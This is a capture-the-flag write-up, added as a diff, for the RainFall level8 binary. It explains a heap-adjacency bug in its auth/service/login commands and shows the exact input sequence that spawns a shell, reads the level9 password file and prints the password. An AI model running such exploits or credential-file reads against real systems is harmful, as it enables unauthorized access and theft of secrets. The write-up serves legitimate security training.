@@ -1,0 +1,94 @@
+First, let's examine the binary to understand its protections and behavior: 
+
+Let's run the program to see how it behaves: 
+
+	level8@RainFall:~$ ./level8
+	(nil), (nil)
+
+The program appears to be an interactive command-line interface displaying two memory addresses (initially NULL). 
+
+Using GDB, we can inspect the binary's functionality: 
+
+See the assembly code in the ressources folder
+
+The disassembly reveals a large function that reads commands in a loop and performs different actions based on string comparisons. Let's identify the command strings: 
+
+	(gdb) x/s 0x8048819
+	0x8048819: "auth "
+	(gdb) x/s 0x804881f
+	0x804881f: "reset"
+	(gdb) x/s 0x8048825
+	0x8048825: "service"
+	(gdb) x/s 0x804882d
+	0x804882d: "login"
+	(gdb) x/s 0x8048833
+	0x8048833: "/bin/sh"
+ 
+By analyzing the disassembly, we can determine the program's behavior: 
+
+The program maintains two global variables: 
+	 auth at address 0x8049aac (shown in the first position of the prompt)
+	 service at address 0x8049ab0 (shown in the second position of the prompt)
+
+It accepts four commands: 
+
+	auth <name>:  
+		 Allocates 4 bytes for the auth pointer
+		 Initializes it to zero
+		 Copies the string after "auth " into this buffer (if length <= 30)
+
+	reset: 
+		 Frees the auth pointer
+		 
+	service <name>: 
+		 Makes a duplicate of the string after "service "
+		 Stores it in the service pointer
+
+	login: 
+		 Checks if *(auth + 32) (a value 32 bytes after the beginning of auth) is non-zero
+		 If true, calls system("/bin/sh")
+		 Otherwise, prints an error message
+
+The key vulnerability is: 
+
+     The auth command allocates only 4 bytes but allows copying up to 30 bytes
+     The login command checks a value at offset 32 from the start of the auth buffer
+     When we allocate both auth and service buffers, they might be adjacent in memory
+     
+
+This creates an opportunity: by allocating a small auth buffer followed by a service buffer, we can place non-zero data at offset 32 from the start of auth. 
+
+Our exploitation strategy: 
+
+     Use auth to allocate a small buffer (4 bytes)
+     Use service with a sufficiently long string to place non-zero data at auth+32
+     Call login to trigger the shell
+     
+	 	level8@RainFall:~$ ./level8
+		(nil), (nil)
+		auth a
+		0x804a008, (nil)
+		service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+		0x804a008, 0x804a018
+		login
+		$ whoami
+		level9
+		$ cat /home/user/level9/.pass
+		c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+
+The heap memory layout is critical to understanding this exploit: 
+ 
+Lower memory addresses
++-------------------+
+| auth buffer (4B)  | ← Points to by global var at 0x8049aac
+| actual data: "a\0\0\0" |
++-------------------+
+| padding/metadata  |
++-------------------+
+| service buffer    | ← Pointed to by global var at 0x8049ab0
+| "aaaaaaaaa\0"     |
++-------------------+
+Higher memory addresses
+
+The login check examines the memory at auth + 32. Since this character is non-zero ('a'), the check passes and we get a shell. 
